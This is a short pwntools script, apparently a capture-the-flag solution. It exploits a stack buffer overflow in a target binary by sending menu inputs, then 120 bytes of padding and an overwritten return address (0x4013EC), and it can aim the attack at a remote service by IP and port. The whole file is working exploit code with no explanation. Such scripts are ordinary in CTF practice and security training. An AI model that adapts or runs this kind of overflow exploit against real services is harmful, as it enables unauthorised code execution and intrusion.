from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """) 
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    padding = b'T' * 120
    payload = padding 
    
    payload+=p64(0x00000000004013EC)

    p.sendline("13523148")
    p.sendline("2")
    p.sendline(payload)
    p.interactive() 

solve()